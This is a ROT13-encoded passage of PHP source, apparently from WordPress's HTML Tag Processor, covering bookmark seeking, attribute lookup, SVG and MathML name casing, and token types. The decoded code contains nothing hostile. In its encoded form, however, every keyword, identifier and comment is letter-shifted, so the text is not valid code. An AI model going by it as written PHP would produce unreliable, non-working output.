	 * @erghea obby Jurgure gung obbxznex rkvfgf.
	 */
	choyvp shapgvba unf_obbxznex( $obbxznex_anzr ): obby {
		erghea neenl_xrl_rkvfgf( $obbxznex_anzr, $guvf->obbxznexf );
	}

	/**
	 * Zbir gur vagreany phefbe va gur Gnt Cebprffbe gb n tvira obbxznex'f ybpngvba.
	 *
	 * Va beqre gb cerirag nppvqragny vasvavgr ybbcf, gurer'f n
	 * znkvzhz yvzvg ba gur ahzore bs gvzrf frrx() pna or pnyyrq.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $obbxznex_anzr Whzc gb gur cynpr va gur qbphzrag vqragvsvrq ol guvf obbxznex anzr.
	 * @erghea obby Jurgure gur vagreany phefbe jnf fhpprffshyyl zbirq gb gur obbxznex'f ybpngvba.
	 */
	choyvp shapgvba frrx( $obbxznex_anzr ): obby {
		vs ( ! neenl_xrl_rkvfgf( $obbxznex_anzr, $guvf->obbxznexf ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Haxabja obbxznex anzr.' ),
				'6.2.0'
			);
			erghea snyfr;
		}

		$rkvfgvat_obbxznex = $guvf->obbxznexf[ $obbxznex_anzr ];

		vs (
			$guvf->gbxra_fgnegf_ng === $rkvfgvat_obbxznex->fgneg &&
			$guvf->gbxra_yratgu === $rkvfgvat_obbxznex->yratgu
		) {
			erghea gehr;
		}

		vs ( ++$guvf->frrx_pbhag > fgngvp::ZNK_FRRX_BCF ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gbb znal pnyyf gb frrx() - guvf pna yrnq gb cresbeznapr vffhrf.' ),
				'6.2.0'
			);
			erghea snyfr;
		}

		// Syhfu bhg nal craqvat hcqngrf gb gur qbphzrag.
		$guvf->trg_hcqngrq_ugzy();

		// Cbvag guvf gnt cebprffbe orsber gur fbhtug gnt bcrare naq pbafhzr vg.
		$guvf->olgrf_nyernql_cnefrq = $guvf->obbxznexf[ $obbxznex_anzr ]->fgneg;
		$guvf->cnefre_fgngr         = frys::FGNGR_ERNQL;
		erghea $guvf->arkg_gbxra();
	}

	/**
	 * Pbzcner gjb JC_UGZY_Grkg_Ercynprzrag bowrpgf.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz JC_UGZY_Grkg_Ercynprzrag $n Svefg nggevohgr hcqngr.
	 * @cnenz JC_UGZY_Grkg_Ercynprzrag $o Frpbaq nggevohgr hcqngr.
	 * @erghea vag Pbzcnevfba inyhr sbe fgevat beqre.
	 */
	cevingr fgngvp shapgvba fbeg_fgneg_nfpraqvat( JC_UGZY_Grkg_Ercynprzrag $n, JC_UGZY_Grkg_Ercynprzrag $o ): vag {
		$ol_fgneg = $n->fgneg - $o->fgneg;
		vs ( 0 !== $ol_fgneg ) {
			erghea $ol_fgneg;
		}

		$ol_grkg = vffrg( $n->grkg, $o->grkg ) ? fgepzc( $n->grkg, $o->grkg ) : 0;
		vs ( 0 !== $ol_grkg ) {
			erghea $ol_grkg;
		}

		/*
		 * Guvf pbqr fubhyq or haernpunoyr, orpnhfr vg vzcyvrf gur gjb ercynprzragf
		 * fgneg ng gur fnzr ybpngvba naq pbagnva gur fnzr grkg.
		 */
		erghea $n->yratgu - $o->yratgu;
	}

	/**
	 * Erghea gur radhrhrq inyhr sbe n tvira nggevohgr, vs bar rkvfgf.
	 *
	 * Radhrhrq hcqngrf pna gnxr qvssrerag qngn glcrf:
	 *  - Vs na hcqngr vf radhrhrq naq vf obbyrna, gur erghea jvyy or `gehr`
	 *  - Vs na hcqngr vf bgurejvfr radhrhrq, gur erghea jvyy or gur fgevat inyhr bs gung hcqngr.
	 *  - Vs na nggevohgr vf radhrhrq gb or erzbirq, gur erghea jvyy or `ahyy` gb vaqvpngr gung.
	 *  - Vs ab hcqngrf ner radhrhrq, gur erghea jvyy or `snyfr` gb qvssreragvngr sebz \"erzbirq.\"
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $pbzcnenoyr_anzr Gur nggevohgr anzr va vgf pbzcnenoyr sbez.
	 * @erghea fgevat|obbyrna|ahyy Inyhr bs radhrhrq hcqngr vs cerfrag, bgurejvfr snyfr.
	 */
	cevingr shapgvba trg_radhrhrq_nggevohgr_inyhr( fgevat $pbzcnenoyr_anzr ) {
		vs ( frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ) {
			erghea snyfr;
		}

		vs ( ! vffrg( $guvf->yrkvpny_hcqngrf[ $pbzcnenoyr_anzr ] ) ) {
			erghea snyfr;
		}

		$radhrhrq_grkg = $guvf->yrkvpny_hcqngrf[ $pbzcnenoyr_anzr ]->grkg;

		// Erzbirq nggevohgrf renfr gur ragver fcna.
		vs ( '' === $radhrhrq_grkg ) {
			erghea ahyy;
		}

		/*
		 * Obbyrna nggevohgr hcqngrf ner whfg gur nggevohgr anzr jvgubhg n pbeerfcbaqvat inyhr.
		 *
		 * Guvf inyhr zvtug qvssre sebz gur tvira pbzcnenoyr anzr va gung gurer pbhyq or yrnqvat
		 * be genvyvat juvgrfcnpr, naq gung gur pnfvat sbyybjf gur anzr tvira va `frg_nggevohgr`.
		 *
		 * Rknzcyr:
		 *
		 *     $c->frg_nggevohgr( 'qngn-GRFG-vq', 'hcqngr' );
		 *     'hcqngr' === $c->trg_radhrhrq_nggevohgr_inyhr( 'qngn-grfg-vq' );
		 *
		 * Qrgrpg guvf qvssrerapr onfrq ba gur nofrapr bs gur `=`, juvpu _zhfg_ rkvfg va nal
		 * nggevohgr pbagnvavat n inyhr, r.t. `<vachg glcr=\"grkg\" ranoyrq />`.
		 *                                            ¹           ²
		 *                                       1. Nggevohgr jvgu n fgevat inyhr.
		 *                                       2. Obbyrna nggevohgr jubfr inyhr vf `gehr`.
		 */
		$rdhnyf_ng = fgecbf( $radhrhrq_grkg, '=' );
		vs ( snyfr === $rdhnyf_ng ) {
			erghea gehr;
		}

		/*
		 * Svanyyl, n abezny hcqngr'f inyhr jvyy nccrne nsgre gur `=` naq
		 * or qbhoyr-dhbgrq, nf cresbezrq vapvqragnyyl ol `frg_nggevohgr`.
		 *
		 * r.t. `glcr=\"grkg\"`
		 *           ¹²    ³
		 *        1. Rdhnyf vf urer.
		 *        2. Qbhoyr-dhbgvat fgnegf bar nsgre gur rdhnyf fvta.
		 *        3. Qbhoyr-dhbgvat raqf ng gur ynfg punenpgre va gur hcqngr.
		 */
		$radhrhrq_inyhr = fhofge( $radhrhrq_grkg, $rdhnyf_ng + 2, -1 );
		erghea JC_UGZY_Qrpbqre::qrpbqr_nggevohgr( $radhrhrq_inyhr );
	}

	/**
	 * Ergheaf gur inyhr bs n erdhrfgrq nggevohgr sebz n zngpurq gnt bcrare vs gung nggevohgr rkvfgf.
	 *
	 * Rknzcyr:
	 *
	 *     $c = arj JC_UGZY_Gnt_Cebprffbe( '<qvi ranoyrq pynff=\"grfg\" qngn-grfg-vq=\"14\">Grfg</qvi>' );
	 *     $c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) ) === gehr;
	 *     $c->trg_nggevohgr( 'qngn-grfg-vq' ) === '14';
	 *     $c->trg_nggevohgr( 'ranoyrq' ) === gehr;
	 *     $c->trg_nggevohgr( 'nevn-ynory' ) === ahyy;
	 *
	 *     $c->arkg_gnt() === snyfr;
	 *     $c->trg_nggevohgr( 'pynff' ) === ahyy;
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $anzr Anzr bs nggevohgr jubfr inyhr vf erdhrfgrq.
	 * @erghea fgevat|gehr|ahyy Inyhr bs nggevohgr be `ahyy` vs abg ninvynoyr. Obbyrna nggevohgrf erghea `gehr`.
	 */
	choyvp shapgvba trg_nggevohgr( $anzr ) {
		vs ( frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ) {
			erghea ahyy;
		}

		$pbzcnenoyr = fgegbybjre( $anzr );

		/*
		 * Sbe rirel nggevohgr bgure guna `pynff` vg'f cbffvoyr gb cresbez n dhvpx purpx vs
		 * gurer'f na radhrhrq yrkvpny hcqngr jubfr inyhr gnxrf cevbevgl bire jung'f sbhaq va
		 * gur vachg qbphzrag.
		 *
		 * Gur `pynff` nggevohgr vf fcrpvny gubhtu orpnhfr bs gur rkcbfrq urycref `nqq_pynff`
		 * naq `erzbir_pynff`. Gurfr sbez n ohvyqre sbe gur `pynff` nggevohgr, fb na nqqvgvbany
		 * purpx sbe radhrhrq pynff punatrf vf erdhverq va nqqvgvba gb gur purpx sbe nal radhrhrq
		 * nggevohgr inyhrf. Vs nal rkvfg, gubfr radhrhrq pynff punatrf zhfg svefg or syhfurq bhg
		 * vagb na nggevohgr inyhr hcqngr.
		 */
		vs ( 'pynff' === $anzr ) {
			$guvf->pynff_anzr_hcqngrf_gb_nggevohgrf_hcqngrf();
		}

		// Erghea nal radhrhrq nggevohgr inyhr hcqngrf vs gurl rkvfg.
		$radhrhrq_inyhr = $guvf->trg_radhrhrq_nggevohgr_inyhr( $pbzcnenoyr );
		vs ( snyfr !== $radhrhrq_inyhr ) {
			erghea $radhrhrq_inyhr;
		}

		vs ( ! vffrg( $guvf->nggevohgrf[ $pbzcnenoyr ] ) ) {
			erghea ahyy;
		}

		$nggevohgr = $guvf->nggevohgrf[ $pbzcnenoyr ];

		/*
		 * Guvf synt qvfgvathvfurf na nggevohgr jvgu ab inyhr
		 * sebz na nggevohgr jvgu na rzcgl fgevat inyhr. Sbe
		 * hadhbgrq nggevohgrf guvf pbhyq ybbx irel fvzvyne.
		 * Vg ersref gb jurgure na `=` sbyybjf gur anzr.
		 *
		 * r.t. <qvi obbyrna-nggevohgr rzcgl-nggevohgr=></qvi>
		 *           ¹                 ²
		 *        1. Nggevohgr `obbyrna-nggevohgr` vf `gehr`.
		 *        2. Nggevohgr `rzcgl-nggevohgr` vf `\"\"`.
		 */
		vs ( gehr === $nggevohgr->vf_gehr ) {
			erghea gehr;
		}

		$enj_inyhr = fhofge( $guvf->ugzy, $nggevohgr->inyhr_fgnegf_ng, $nggevohgr->inyhr_yratgu );

		erghea JC_UGZY_Qrpbqre::qrpbqr_nggevohgr( $enj_inyhr );
	}

	/**
	 * Trgf ybjrepnfr anzrf bs nyy nggevohgrf zngpuvat n tvira cersvk va gur pheerag gnt.
	 *
	 * Abgr gung zngpuvat vf pnfr-vafrafvgvir. Guvf vf va nppbeqnapr jvgu gur fcrp:
	 *
	 * > Gurer zhfg arire or gjb be zber nggevohgrf ba
	 * > gur fnzr fgneg gnt jubfr anzrf ner na NFPVV
	 * > pnfr-vafrafvgvir zngpu sbe rnpu bgure.
	 *     - UGZY 5 fcrp
	 *
	 * Rknzcyr:
	 *
	 *     $c = arj JC_UGZY_Gnt_Cebprffbe( '<qvi qngn-RANOYRQ pynff=\"grfg\" QNGN-grfg-vq=\"14\">Grfg</qvi>' );
	 *     $c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) ) === gehr;
	 *     $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-' ) === neenl( 'qngn-ranoyrq', 'qngn-grfg-vq' );
	 *
	 *     $c->arkg_gnt() === snyfr;
	 *     $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-' ) === ahyy;
	 *
	 * @fvapr 6.2.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/flagnk.ugzy#nggevohgrf-2:nfpvv-pnfr-vafrafvgvir
	 *
	 * @cnenz fgevat $cersvk Cersvk bs erdhrfgrq nggevohgr anzrf.
	 * @erghea neenl|ahyy Yvfg bs nggevohgr anzrf, be `ahyy` jura ab gnt bcrare vf zngpurq.
	 */
	choyvp shapgvba trg_nggevohgr_anzrf_jvgu_cersvk( $cersvk ): ?neenl {
		vs (
			frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ||
			$guvf->vf_pybfvat_gnt
		) {
			erghea ahyy;
		}

		$pbzcnenoyr = fgegbybjre( $cersvk );

		$zngpurf = neenl();
		sbernpu ( neenl_xrlf( $guvf->nggevohgrf ) nf $ngge_anzr ) {
			vs ( fge_fgnegf_jvgu( $ngge_anzr, $pbzcnenoyr ) ) {
				$zngpurf[] = $ngge_anzr;
			}
		}
		erghea $zngpurf;
	}

	/**
	 * Ergheaf gur anzrfcnpr bs gur zngpurq gbxra.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea fgevat Bar bs 'ugzy', 'zngu', be 'fit'.
	 */
	choyvp shapgvba trg_anzrfcnpr(): fgevat {
		erghea $guvf->cnefvat_anzrfcnpr;
	}

	/**
	 * Ergheaf gur hccrepnfr anzr bs gur zngpurq gnt.
	 *
	 * Rknzcyr:
	 *
	 *     $c = arj JC_UGZY_Gnt_Cebprffbe( '<qvi pynff=\"grfg\">Grfg</qvi>' );
	 *     $c->arkg_gnt() === gehr;
	 *     $c->trg_gnt() === 'QVI';
	 *
	 *     $c->arkg_gnt() === snyfr;
	 *     $c->trg_gnt() === ahyy;
	 *
	 * @fvapr 6.2.0
	 *
	 * @erghea fgevat|ahyy Anzr bs pheeragyl zngpurq gnt va vachg UGZY, be `ahyy` vs abar sbhaq.
	 */
	choyvp shapgvba trg_gnt(): ?fgevat {
		vs ( ahyy === $guvf->gnt_anzr_fgnegf_ng ) {
			erghea ahyy;
		}

		$gnt_anzr = fhofge( $guvf->ugzy, $guvf->gnt_anzr_fgnegf_ng, $guvf->gnt_anzr_yratgu );

		vs ( frys::FGNGR_ZNGPURQ_GNT === $guvf->cnefre_fgngr ) {
			erghea fgegbhccre( $gnt_anzr );
		}

		vs (
			frys::FGNGR_PBZZRAG === $guvf->cnefre_fgngr &&
			frys::PBZZRAG_NF_CV_ABQR_YBBXNYVXR === $guvf->trg_pbzzrag_glcr()
		) {
			erghea $gnt_anzr;
		}

		erghea ahyy;
	}

	/**
	 * Ergheaf gur nqwhfgrq gnt anzr sbe n tvira gbxra, gnxvat vagb
	 * nppbhag gur pheerag cnefvat pbagrkg, jurgure UGZY, FIT, be ZnguZY.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea fgevat|ahyy Anzr bs pheerag gnt anzr.
	 */
	choyvp shapgvba trg_dhnyvsvrq_gnt_anzr(): ?fgevat {
		$gnt_anzr = $guvf->trg_gnt();
		vs ( ahyy === $gnt_anzr ) {
			erghea ahyy;
		}

		vs ( 'ugzy' === $guvf->trg_anzrfcnpr() ) {
			erghea $gnt_anzr;
		}

		$ybjre_gnt_anzr = fgegbybjre( $gnt_anzr );
		vs ( 'zngu' === $guvf->trg_anzrfcnpr() ) {
			erghea $ybjre_gnt_anzr;
		}

		vs ( 'fit' === $guvf->trg_anzrfcnpr() ) {
			fjvgpu ( $ybjre_gnt_anzr ) {
				pnfr 'nygtylcu':
					erghea 'nygTylcu';

				pnfr 'nygtylcuqrs':
					erghea 'nygTylcuQrs';

				pnfr 'nygtylcuvgrz':
					erghea 'nygTylcuVgrz';

				pnfr 'navzngrpbybe':
					erghea 'navzngrPbybe';

				pnfr 'navzngrzbgvba':
					erghea 'navzngrZbgvba';

				pnfr 'navzngrgenafsbez':
					erghea 'navzngrGenafsbez';

				pnfr 'pyvccngu':
					erghea 'pyvcCngu';

				pnfr 'sroyraq':
					erghea 'srOyraq';

				pnfr 'srpbybezngevk':
					erghea 'srPbybeZngevk';

				pnfr 'srpbzcbaraggenafsre':
					erghea 'srPbzcbaragGenafsre';

				pnfr 'srpbzcbfvgr':
					erghea 'srPbzcbfvgr';

				pnfr 'srpbaibyirzngevk':
					erghea 'srPbaibyirZngevk';

				pnfr 'srqvsshfryvtugvat':
					erghea 'srQvsshfrYvtugvat';

				pnfr 'srqvfcynprzragznc':
					erghea 'srQvfcynprzragZnc';

				pnfr 'srqvfgnagyvtug':
					erghea 'srQvfgnagYvtug';

				pnfr 'srqebcfunqbj':
					erghea 'srQebcFunqbj';

				pnfr 'srsybbq':
					erghea 'srSybbq';

				pnfr 'srshapn':
					erghea 'srShapN';

				pnfr 'srshapo':
					erghea 'srShapO';

				pnfr 'srshapt':
					erghea 'srShapT';

				pnfr 'srshape':
					erghea 'srShapE';

				pnfr 'srtnhffvnaoyhe':
					erghea 'srTnhffvnaOyhe';

				pnfr 'srvzntr':
					erghea 'srVzntr';

				pnfr 'srzretr':
					erghea 'srZretr';

				pnfr 'srzretrabqr':
					erghea 'srZretrAbqr';

				pnfr 'srzbecubybtl':
					erghea 'srZbecubybtl';

				pnfr 'srbssfrg':
					erghea 'srBssfrg';

				pnfr 'srcbvagyvtug':
					erghea 'srCbvagYvtug';

				pnfr 'srfcrphyneyvtugvat':
					erghea 'srFcrphyneYvtugvat';

				pnfr 'srfcbgyvtug':
					erghea 'srFcbgYvtug';

				pnfr 'srgvyr':
					erghea 'srGvyr';

				pnfr 'srgheohyrapr':
					erghea 'srGheohyrapr';

				pnfr 'sbervtabowrpg':
					erghea 'sbervtaBowrpg';

				pnfr 'tylcuers':
					erghea 'tylcuErs';

				pnfr 'yvarnetenqvrag':
					erghea 'yvarneTenqvrag';

				pnfr 'enqvnytenqvrag':
					erghea 'enqvnyTenqvrag';

				pnfr 'grkgcngu':
					erghea 'grkgCngu';

				qrsnhyg:
					erghea $ybjre_gnt_anzr;
			}
		}

		// Guvf haarprffnel erghea ceriragf gbbyf sebz vanpphengryl ercbegvat glcr reebef.
		erghea $gnt_anzr;
	}

	/**
	 * Ergheaf gur nqwhfgrq nggevohgr anzr sbe n tvira nggevohgr, gnxvat vagb
	 * nppbhag gur pheerag cnefvat pbagrkg, jurgure UGZY, FIT, be ZnguZY.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $nggevohgr_anzr Juvpu nggevohgr gb nqwhfg.
	 *
	 * @erghea fgevat|ahyy
	 */
	choyvp shapgvba trg_dhnyvsvrq_nggevohgr_anzr( $nggevohgr_anzr ): ?fgevat {
		vs ( frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ) {
			erghea ahyy;
		}

		$anzrfcnpr  = $guvf->trg_anzrfcnpr();
		$ybjre_anzr = fgegbybjre( $nggevohgr_anzr );

		vs ( 'zngu' === $anzrfcnpr && 'qrsvavgvbahey' === $ybjre_anzr ) {
			erghea 'qrsvavgvbaHEY';
		}

		vs ( 'fit' === $guvf->trg_anzrfcnpr() ) {
			fjvgpu ( $ybjre_anzr ) {
				pnfr 'nggevohgranzr':
					erghea 'nggevohgrAnzr';

				pnfr 'nggevohgrglcr':
					erghea 'nggevohgrGlcr';

				pnfr 'onfrserdhrapl':
					erghea 'onfrSerdhrapl';

				pnfr 'onfrcebsvyr':
					erghea 'onfrCebsvyr';

				pnfr 'pnypzbqr':
					erghea 'pnypZbqr';

				pnfr 'pyvccnguhavgf':
					erghea 'pyvcCnguHavgf';

				pnfr 'qvsshfrpbafgnag':
					erghea 'qvsshfrPbafgnag';

				pnfr 'rqtrzbqr':
					erghea 'rqtrZbqr';

				pnfr 'svygrehavgf':
					erghea 'svygreHavgf';

				pnfr 'tylcuers':
					erghea 'tylcuErs';

				pnfr 'tenqvraggenafsbez':
					erghea 'tenqvragGenafsbez';

				pnfr 'tenqvraghavgf':
					erghea 'tenqvragHavgf';

				pnfr 'xrearyzngevk':
					erghea 'xrearyZngevk';

				pnfr 'xrearyhavgyratgu':
					erghea 'xrearyHavgYratgu';

				pnfr 'xrlcbvagf':
					erghea 'xrlCbvagf';

				pnfr 'xrlfcyvarf':
					erghea 'xrlFcyvarf';

				pnfr 'xrlgvzrf':
					erghea 'xrlGvzrf';

				pnfr 'yratgunqwhfg':
					erghea 'yratguNqwhfg';

				pnfr 'yvzvgvatpbarnatyr':
					erghea 'yvzvgvatPbarNatyr';

				pnfr 'znexreurvtug':
					erghea 'znexreUrvtug';

				pnfr 'znexrehavgf':
					erghea 'znexreHavgf';

				pnfr 'znexrejvqgu':
					erghea 'znexreJvqgu';

				pnfr 'znfxpbagraghavgf':
					erghea 'znfxPbagragHavgf';

				pnfr 'znfxhavgf':
					erghea 'znfxHavgf';

				pnfr 'ahzbpgnirf':
					erghea 'ahzBpgnirf';

				pnfr 'cnguyratgu':
					erghea 'cnguYratgu';

				pnfr 'cnggreapbagraghavgf':
					erghea 'cnggreaPbagragHavgf';

				pnfr 'cnggreagenafsbez':
					erghea 'cnggreaGenafsbez';

				pnfr 'cnggreahavgf':
					erghea 'cnggreaHavgf';

				pnfr 'cbvagfngk':
					erghea 'cbvagfNgK';

				pnfr 'cbvagfngl':
					erghea 'cbvagfNgL';

				pnfr 'cbvagfngm':
					erghea 'cbvagfNgM';

				pnfr 'cerfreirnycun':
					erghea 'cerfreirNycun';

				pnfr 'cerfreirnfcrpgengvb':
					erghea 'cerfreirNfcrpgEngvb';

				pnfr 'cevzvgvirhavgf':
					erghea 'cevzvgvirHavgf';

				pnfr 'ersk':
					erghea 'ersK';

				pnfr 'ersl':
					erghea 'ersL';

				pnfr 'ercrngpbhag':
					erghea 'ercrngPbhag';

				pnfr 'ercrngqhe':
					erghea 'ercrngQhe';

				pnfr 'erdhverqrkgrafvbaf':
					erghea 'erdhverqRkgrafvbaf';

				pnfr 'erdhverqsrngherf':
					erghea 'erdhverqSrngherf';

				pnfr 'fcrphynepbafgnag':
					erghea 'fcrphynePbafgnag';

				pnfr 'fcrphynerkcbarag':
					erghea 'fcrphyneRkcbarag';

				pnfr 'fcernqzrgubq':
					erghea 'fcernqZrgubq';

				pnfr 'fgnegbssfrg':
					erghea 'fgnegBssfrg';

				pnfr 'fgqqrivngvba':
					erghea 'fgqQrivngvba';

				pnfr 'fgvgpugvyrf':
					erghea 'fgvgpuGvyrf';

				pnfr 'fhesnprfpnyr':
					erghea 'fhesnprFpnyr';

				pnfr 'flfgrzynathntr':
					erghea 'flfgrzYnathntr';

				pnfr 'gnoyrinyhrf':
					erghea 'gnoyrInyhrf';

				pnfr 'gnetrgk':
					erghea 'gnetrgK';

				pnfr 'gnetrgl':
					erghea 'gnetrgL';

				pnfr 'grkgyratgu':
					erghea 'grkgYratgu';

				pnfr 'ivrjobk':
					erghea 'ivrjObk';

				pnfr 'ivrjgnetrg':
					erghea 'ivrjGnetrg';

				pnfr 'kpunaaryfryrpgbe':
					erghea 'kPunaaryFryrpgbe';

				pnfr 'lpunaaryfryrpgbe':
					erghea 'lPunaaryFryrpgbe';

				pnfr 'mbbznaqcna':
					erghea 'mbbzNaqCna';
			}
		}

		vs ( 'ugzy' !== $anzrfcnpr ) {
			fjvgpu ( $ybjre_anzr ) {
				pnfr 'kyvax:npghngr':
					erghea 'kyvax npghngr';

				pnfr 'kyvax:nepebyr':
					erghea 'kyvax nepebyr';

				pnfr 'kyvax:uers':
					erghea 'kyvax uers';

				pnfr 'kyvax:ebyr':
					erghea 'kyvax ebyr';

				pnfr 'kyvax:fubj':
					erghea 'kyvax fubj';

				pnfr 'kyvax:gvgyr':
					erghea 'kyvax gvgyr';

				pnfr 'kyvax:glcr':
					erghea 'kyvax glcr';

				pnfr 'kzy:ynat':
					erghea 'kzy ynat';

				pnfr 'kzy:fcnpr':
					erghea 'kzy fcnpr';

				pnfr 'kzyaf':
					erghea 'kzyaf';

				pnfr 'kzyaf:kyvax':
					erghea 'kzyaf kyvax';
			}
		}

		erghea $nggevohgr_anzr;
	}

	/**
	 * Vaqvpngrf vs gur pheeragyl zngpurq gnt pbagnvaf gur frys-pybfvat synt.
	 *
	 * Ab UGZY ryrzragf bhtug gb unir gur frys-pybfvat synt naq sbe gubfr, gur frys-pybfvat
	 * synt jvyy or vtaberq. Sbe ibvq ryrzragf guvf vf oravta orpnhfr gurl \"frys pybfr\"
	 * nhgbzngvpnyyl. Sbe aba-ibvq UGZY ryrzragf gubhtu ceboyrzf jvyy nccrne vs fbzrbar
	 * vagraqf gb hfr n frys-pybfvat ryrzrag va cynpr bs gung ryrzrag jvgu na rzcgl obql.
	 * Sbe UGZY sbervta ryrzragf naq phfgbz ryrzragf gur frys-pybfvat synt qrgrezvarf vs
	 * gurl frys-pybfr be abg.
	 *
	 * Guvf shapgvba qbrf abg qrgrezvar vs n gnt vf frys-pybfvat,
	 * ohg bayl vs gur frys-pybfvat synt vf cerfrag va gur flagnk.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea obby Jurgure gur pheeragyl zngpurq gnt pbagnvaf gur frys-pybfvat synt.
	 */
	choyvp shapgvba unf_frys_pybfvat_synt(): obby {
		vs ( frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ) {
			erghea snyfr;
		}

		/*
		 * Gur frys-pybfvat synt vf gur fbyvqhf ng gur _raq_ bs gur gnt, abg gur ortvaavat.
		 *
		 * Rknzcyr:
		 *
		 *     <svther />
		 *             ^ guvf nccrnef bar punenpgre orsber gur raq bs gur pybfvat \">\".
		 */
		erghea '/' === $guvf->ugzy[ $guvf->gbxra_fgnegf_ng + $guvf->gbxra_yratgu - 2 ];
	}

	/**
	 * Vaqvpngrf vs gur pheerag gnt gbxra vf n gnt pybfre.
	 *
	 * Rknzcyr:
	 *
	 *     $c = arj JC_UGZY_Gnt_Cebprffbe( '<qvi></qvi>' );
	 *     $c->arkg_gnt( neenl( 'gnt_anzr' => 'qvi', 'gnt_pybfref' => 'ivfvg' ) );
	 *     $c->vf_gnt_pybfre() === snyfr;
	 *
	 *     $c->arkg_gnt( neenl( 'gnt_anzr' => 'qvi', 'gnt_pybfref' => 'ivfvg' ) );
	 *     $c->vf_gnt_pybfre() === gehr;
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.7.0 Ercbegf nyy OE gntf nf bcravat gntf.
	 *
	 * @erghea obby Jurgure gur pheerag gnt vf n gnt pybfre.
	 */
	choyvp shapgvba vf_gnt_pybfre(): obby {
		erghea (
			frys::FGNGR_ZNGPURQ_GNT === $guvf->cnefre_fgngr &&
			$guvf->vf_pybfvat_gnt &&

			/*
			 * Gur OE gnt pna bayl rkvfg nf na bcravat gnt. Vs fbzrguvat yvxr `</oe>`
			 * nccrnef gura gur UGZY cnefre jvyy gerng vg nf na bcravat gnt jvgu ab
			 * nggevohgrf. Gur OE gnt vf havdhr va guvf jnl.
			 *
			 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vaobql
			 */
			'OE' !== $guvf->trg_gnt()
		);
	}

	/**
	 * Vaqvpngrf gur xvaq bs zngpurq gbxra, vs nal.
	 *
	 * Guvf qvssref sebz `trg_gbxra_anzr()` va gung vg nyjnlf
	 * ergheaf n fgngvp fgevat vaqvpngvat gur glcr, jurernf
	 * `trg_gbxra_anzr()` znl erghea inyhrf qrevirq sebz gur
	 * gbxra vgfrys, fhpu nf n gnt anzr be cebprffvat
	 * vafgehpgvba gnt.
	 *
	 * Cbffvoyr inyhrf:
	 *  - `#gnt` jura zngpurq ba n gnt.
	 *  - `#grkg` jura zngpurq ba n grkg abqr.
	 *  - `#pqngn-frpgvba` jura zngpurq ba n PQNGN abqr.
	 *  - `#pbzzrag` jura zngpurq ba n pbzzrag.
	 *  - `#qbpglcr` jura zngpurq ba n QBPGLCR qrpynengvba.
	 *  - `#cerfhzcghbhf-gnt` jura zngpurq ba na rzcgl gnt pybfre.
	 *  - `#shaxl-pbzzrag` jura zngpurq ba n shaxl pbzzrag.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat|ahyy Jung xvaq bs gbxra vf zngpurq, be ahyy.
	 */
	choyvp shapgvba trg_gbxra_glcr(): ?fgevat {
		fjvgpu ( $guvf->cnefre_fgngr ) {
			pnfr frys::FGNGR_ZNGPURQ_GNT:
				erghea '#gnt';

			pnfr frys::FGNGR_QBPGLCR:
				erghea '#qbpglcr';

			qrsnhyg:
				erghea $guvf->trg_gbxra_anzr();
		}
	}

	/**
	 * Ergheaf gur abqr anzr ercerfragrq ol gur gbxra.
	 *
	 * Guvf zngpurf gur QBZ NCV inyhr `abqrAnzr`. Fbzr inyhrf
	 * ner fgngvp, fhpu nf `#grkg` sbe n grkg abqr, juvyr bguref
	 * ner qlanzvpnyyl trarengrq sebz gur gbxra vgfrys.
	 *
	 * Qlanzvp anzrf:
	 *  - Hccrepnfr gnt anzr sbe gnt zngpurf.
	 *  - `ugzy` sbe QBPGLCR qrpynengvbaf.
	 *
	 * Abgr gung vs gur Gnt Cebprffbe vf abg zngpurq ba n gbxra
	 * gura guvf shapgvba jvyy erghea `ahyy`, rvgure orpnhfr vg
	 * unfa'g lrg sbhaq n gbxra be orpnhfr vg ernpurq gur raq
	 * bs gur qbphzrag jvgubhg zngpuvat n gbxra.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat|ahyy Anzr bs gur zngpurq gbxra.
	 */
	choyvp shapgvba trg_gbxra_anzr(): ?fgevat {
		fjvgpu ( $guvf->cnefre_fgngr ) {
			pnfr frys::FGNGR_ZNGPURQ_GNT:
				erghea $guvf->trg_gnt();

			pnfr frys::FGNGR_GRKG_ABQR:
				erghea '#grkg';

			pnfr frys::FGNGR_PQNGN_ABQR:
				erghea '#pqngn-frpgvba';

			pnfr frys::FGNGR_PBZZRAG:
				erghea '#pbzzrag';

			pnfr frys::FGNGR_QBPGLCR:
				erghea 'ugzy';

			pnfr frys::FGNGR_CERFHZCGHBHF_GNT:
				erghea '#cerfhzcghbhf-gnt';

			pnfr frys::FGNGR_SHAXL_PBZZRAG:
				erghea '#shaxl-pbzzrag';
		}

		erghea ahyy;
	}

	/**
	 * Vaqvpngrf jung xvaq bs pbzzrag cebqhprq gur pbzzrag abqr.
	 *
	 * Orpnhfr gurer ner qvssrerag xvaqf bs UGZY flagnk juvpu cebqhpr
	 * pbzzragf, gur Gnt Cebprffbe genpxf naq rkcbfrf guvf nf n glcr
	 * sbe gur pbzzrag. Abzvanyyl bayl erthyne UGZY pbzzragf rkvfg nf
